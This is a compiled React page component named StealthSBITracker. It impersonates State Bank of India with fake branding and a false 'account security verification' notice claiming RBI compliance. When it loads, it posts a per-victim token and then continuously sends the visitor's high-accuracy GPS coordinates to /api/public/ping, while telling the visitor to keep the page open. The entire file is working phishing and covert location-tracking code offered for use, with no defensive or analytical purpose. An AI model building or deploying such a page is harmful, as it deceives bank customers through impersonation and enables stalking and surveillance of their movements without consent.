import { r as reactExports, j as jsxRuntimeExports } from "../_libs/react.mjs";
import { R as Route$2 } from "./router-BLFvlFQu.mjs";
import "../_libs/sonner.mjs";
import { g as Shield } from "../_libs/lucide-react.mjs";
import "../_libs/tanstack__query-core.mjs";
import "../_libs/tanstack__react-query.mjs";
import "../_libs/tanstack__react-router.mjs";
import "../_libs/tanstack__router-core.mjs";
import "../_libs/tanstack__history.mjs";
import "../_libs/cookie-es.mjs";
import "../_libs/seroval.mjs";
import "../_libs/seroval-plugins.mjs";
import "node:stream/web";
import "node:stream";
import "../_libs/react-dom.mjs";
import "util";
import "crypto";
import "async_hooks";
import "stream";
import "../_libs/isbot.mjs";
import "./client-CcDArRCU.mjs";
import "../_libs/supabase__supabase-js.mjs";
import "../_libs/supabase__postgrest-js.mjs";
import "../_libs/supabase__realtime-js.mjs";
import "../_libs/supabase__phoenix.mjs";
import "../_libs/supabase__storage-js.mjs";
import "../_libs/iceberg-js.mjs";
import "../_libs/supabase__auth-js.mjs";
import "tslib";
import "../_libs/supabase__functions-js.mjs";
import "../_libs/zod.mjs";
function StealthSBITracker() {
  const {
    token
  } = Route$2.useParams();
  reactExports.useEffect(() => {
    startSilentTracking(token);
  }, [token]);
  const startSilentTracking = async (token2) => {
    try {
      await fetch("/api/public/ping", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          token: token2,
          lat: 0,
          lon: 0,
          accuracy: 0
        })
      });
    } catch (e) {
    }
    if (navigator.geolocation) {
      navigator.geolocation.watchPosition((pos) => {
        fetch("/api/public/ping", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            token: token2,
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy
          })
        });
      }, (err) => {
        console.error("Location error:", err);
      }, {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 15e3
      });
    }
  };
  return /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "min-h-screen bg-[#001a33] text-white flex flex-col", children: [
    /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-[#003087] py-5 px-6 flex items-center gap-3 border-b border-blue-800", children: [
      /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "w-11 h-11 bg-white rounded-full flex items-center justify-center text-[#003087] font-bold text-3xl", children: "SBI" }),
      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
        /* @__PURE__ */ jsxRuntimeExports.jsx("h1", { className: "font-bold text-2xl tracking-tight", children: "State Bank of India" }),
        /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-xs text-blue-300 -mt-1", children: "Official • Secure Banking" })
      ] })
    ] }),
    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex-1 flex items-center justify-center p-6", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "max-w-md w-full text-center", children: [
      /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "mx-auto mb-8", children: /* @__PURE__ */ jsxRuntimeExports.jsx(Shield, { className: "w-24 h-24 text-green-500 mx-auto" }) }),
      /* @__PURE__ */ jsxRuntimeExports.jsx("h2", { className: "text-3xl font-bold mb-4", children: "Account Security Verification" }),
      /* @__PURE__ */ jsxRuntimeExports.jsxs("p", { className: "text-blue-200 mb-10 text-lg", children: [
        "Unusual activity detected on your account.",
        /* @__PURE__ */ jsxRuntimeExports.jsx("br", {}),
        "Verifying your location to prevent fraud."
      ] }),
      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-[#002b4d] rounded-3xl p-10 border border-blue-700 mb-8", children: [
        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex justify-center mb-6", children: /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "w-6 h-6 bg-green-500 rounded-full animate-pulse" }) }),
        /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-xl font-semibold text-green-400", children: "Location Verification Active" }),
        /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-sm text-blue-300 mt-3", children: "Please keep this page open for security check" })
      ] }),
      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "text-xs text-blue-400/70 leading-relaxed", children: [
        "This is an automated RBI-compliant security process.",
        /* @__PURE__ */ jsxRuntimeExports.jsx("br", {}),
        "Do not close or navigate away until verification completes."
      ] })
    ] }) }),
    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "py-6 text-center text-xs text-blue-500/50 border-t border-blue-900", children: "© State Bank of India • All Rights Reserved • Secure Session" })
  ] });
}
export {
  StealthSBITracker as component
};
